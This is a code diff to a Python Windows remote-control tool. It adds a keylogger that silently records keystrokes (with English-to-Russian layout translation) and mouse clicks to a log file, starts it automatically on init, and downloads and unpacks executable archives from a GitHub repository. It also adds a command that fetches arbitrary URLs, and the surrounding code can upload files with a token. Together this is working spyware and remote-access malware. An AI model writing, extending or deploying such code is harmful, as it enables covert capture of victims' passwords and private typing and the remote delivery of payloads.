@@ -12,14 +12,8 @@ from urllib.request import urlretrieve
 from github import Github, InputGitTreeElement
 import shlex
 
-current_path = ''
-infoA = False
-cursor = [(0, 0), 0, 0]
-cursor_down = [0, 0]
-check_init = True
-load_prefix = 'https://raw.githubusercontent.com/'
-load_exe = 'aantr/win-host/main/executable.zip'
-load_images = 'aantr/win-host/main/images.zip'
+from pynput import keyboard, mouse
+from ctypes import windll, WinDLL
 
 
 def command(s, reply=False):
@@ -66,7 +60,6 @@ def copytree_update(src, dst, updateAll=False):  # Advanced version of copy func
             shutil.copy(s, d)
 
 
-#  For pranks:
 def set_wallpaper(p, iA=False):
     if iA:
         ctypes.windll.user32.SystemParametersInfoA(20, 0, os.path.abspath(p), 3)
@@ -75,7 +68,6 @@ def set_wallpaper(p, iA=False):
 
 
 def sleep_cursor(time_secs):
-    global cursor
     cursor[0] = autoit.mouse_get_pos()
     cursor[1] = time_secs
 
@@ -98,8 +90,12 @@ def close_active_win():
 
 def github_upload(token, repo, path):
     dt = datetime.datetime.now()
-    name = f'{os.path.split(path)[-1]}_{dt.date()}_' \
-           f'{dt.time().hour}-{dt.time().minute}-{dt.time().second}'
+    s_time = f'{str(dt.time().hour).rjust(2, "0")}-' \
+             f'{str(dt.time().minute).rjust(2, "0")}-' \
+             f'{str(dt.time().second).rjust(2, "0")}'
+    name = f'{dt.date()}_' \
+           f'{s_time}_' \
+           f'{os.path.split(path)[-1]}'
     zip_file = name + '.zip'
     if os.path.isdir(path):
         shutil.make_archive(name, 'zip', path)
@@ -133,14 +129,116 @@ def github_upload(token, repo, path):
     os.remove(zip_file)
 
 
+class KeyLogger:
+    def get_key_name(self, key):
+        if isinstance(key, keyboard.KeyCode):
+            return key.char
+        return str(key)
+
+    def caps_state(self):
+        hllDll = WinDLL("User32.dll")
+        return hllDll.GetKeyState(0x14) & 0xffff != 0
+
+    def on_press(self, key):
+        hwnd = self.user32.GetForegroundWindow()
+        threadID = self.user32.GetWindowThreadProcessId(hwnd, None)
+        CodeLang = self.user32.GetKeyboardLayout(threadID)
+        if isinstance(key, keyboard.KeyCode):
+            key_name = key.char
+            d = '0123456789*+ -./'
+            if not key_name and 96 <= key.vk <= 112:
+                key_name = str(d[key.vk - 96])
+            if key_name and len(key_name) == 1:
+                if CodeLang == 0x4090409:
+                    ...
+                elif CodeLang == 0x4190419:
+                    if key_name in self._trans_table:
+                        key_name = self._trans_table[key_name]
+                else:
+                    # print('error')
+                    ...
+                if self.caps_state():
+                    if key_name.islower():
+                        key_name = key_name.upper()
+                    else:
+                        key_name = key_name.lower()
+                self.current_line += key_name
+        elif hasattr(key, 'name'):
+            name = key.name
+            if name == 'backspace':
+                self.current_line = self.current_line[:-1]
+            elif name == 'space':
+                self.current_line += ' '
+            elif name in self.ignore_keys:
+                ...
+            else:
+                if self.current_line:
+                    self.log_line(self.current_line)
+                    self.current_line = ''
+                self.log_symbol(name)
+
+    def on_click(self, x, y, button, pressed):
+        if pressed and button == mouse.Button.left and self.previous_log != 'click':
+            self.log_symbol('click')
+
+    def log_line(self, line):
+        dt = datetime.datetime.now()
+        prefix = f'{dt.date()}/{str(dt.hour).rjust(2, "0")}:' \
+                 f'{str(dt.minute).rjust(2, "0")} -> '
+        self.output += '\n' + prefix + line + '\n'
+        self.check_temp_output()
+        self.previous_log = line
+
+    def log_symbol(self, s):
+        self.output += f'[{s}]'
+        self.check_temp_output()
+        self.previous_log = s
+
+    def check_temp_output(self):
+        if len(self.output) >= self.output_max_temp_symbols:
+            with open(self.filename, 'a') as f:
+                f.write(self.output)
+                self.output = ''
+
+    def start(self, filename):
+        self.user32 = windll.user32
+        self._eng_chars = u"~!@#$%^&qwertyuiop[]asdfghjkl;'zxcvbnm,./QWERTYUIOP{}ASDFGHJKL:\"|ZXCVBNM<>?"
+        self._rus_chars = u"ё!\"№;%:?йцукенгшщзхъфывапролджэячсмитьбю.ЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭ/ЯЧСМИТЬБЮ,"
+        self._trans_table = dict(zip(self._eng_chars, self._rus_chars))
+        self.ignore_keys = {'shift', 'alt_l', 'alt_r', 'ctrl_l', 'ctrl_r',
+                            'caps_lock', 'tab'}
+        self.current_line = ''
+        self.previous_log = ''
+        self.filename = filename
+        self.output = ''
+        self.output_max_temp_symbols = 200
+        self.max_size_log_clear = 2 ** 20 * 5
+        with open(self.filename, 'a') as f:
+            f.write('\n')
+        size = os.path.getsize(self.filename)
+        if size >= self.max_size_log_clear:
+            open(self.filename, 'w')
+
+        key_listener = keyboard.Listener(on_press=self.on_press)
+        key_listener.start()
+        mouse_listener = mouse.Listener(on_click=self.on_click)
+        mouse_listener.start()
+        time.sleep(1000)
+
+
 def cmd(s: str, directory='', v=False):
     global current_path, infoA, cursor_down
     if v:
-        return 7, 3
+        return 8, 0
 
     # ?
-    variables = {'im': os.path.join(directory, 'images'),
-                 'path': current_path}
+    variables = {
+        'script_dir': directory,
+        'images': os.path.join(directory, 'images'),
+        'executables': os.path.join(directory, 'executable'),
+        'path': current_path,
+        'keylog': os.path.join(directory, keylog_file),
+    }
     for k, v in variables.items():
         s = s.replace(f'?{k}', v)
     cmd_name, *args = list(map(lambda x: x.strip('"').strip("'"),
@@ -164,7 +262,10 @@ def cmd(s: str, directory='', v=False):
             return b''
         return 'Wrong syntax'.encode('cp866')
     elif cmd_name == '.download':
-        return b''
+        if len(args) == 2:
+            urlretrieve(args[1], args[0])
+            return b''
+        return 'Wrong syntax'.encode('cp866')
     elif cmd_name == '.upload':
         if len(args) == 3:
             path, token, repo = args
@@ -265,10 +366,24 @@ def cmd(s: str, directory='', v=False):
     return 'No such command'.encode('cp866')
 
 
+def init(directory):
+    print('init')
+    check_folders = {'executable': load_exe,
+                     'images': load_images}
+    for k, v in check_folders.items():
+        name, url = k, v
+        print(f'check {name}')
+        if not os.path.exists(os.path.join(directory, name)):
+            path = os.path.join(directory, f'{name}.zip')
+            urlretrieve(load_prefix + url, path)
+            shutil.unpack_archive(os.path.join(directory, f'{name}.zip'), directory, 'zip')
+            os.remove(os.path.join(directory, f'{name}.zip'))
+    keylogger.start(os.path.join(directory, keylog_file))
+
+
 def track(directory=''):
-    delay = 0.1
-    time.sleep(delay)
     global check_init
+
     if cursor[1] > 0:
         if cursor[2] == 0:
             cursor[2] = time.time()
@@ -284,17 +399,23 @@ def track(directory=''):
         autoit.mouse_down()
         if time.time() - cursor_down[1] > cursor_down[0]:
             cursor_down[0] = 0
-    elif check_init:
+    if check_init:
+        init(directory)
         check_init = False
-        print('check init')
-        check_folders = {'executable': load_exe,
-                         'images': load_images}
-        for k, v in check_folders.items():
-            name, url = k, v
-            print(f'check {name}')
-            if not os.path.exists(os.path.join(directory, name)):
-                path = os.path.join(directory, f'{name}.zip')
-                urlretrieve(load_prefix + url, path)
-                shutil.unpack_archive(os.path.join(directory, f'{name}.zip'), directory, 'zip')
-                os.remove(os.path.join(directory, f'{name}.zip'))
-        print('ok')
+
+    delay = 0.1
+    time.sleep(delay)
+
+
+infoA = False
+cursor = [(0, 0), 0, 0]
+cursor_down = [0, 0]
+check_init = True
+current_path = ''
+keylog_file = 'keylog.txt'
+
+load_prefix = 'https://raw.githubusercontent.com/'
+load_exe = 'aantr/win-host/main/executable.zip'
+load_images = 'aantr/win-host/main/images.zip'
+
+keylogger = KeyLogger()
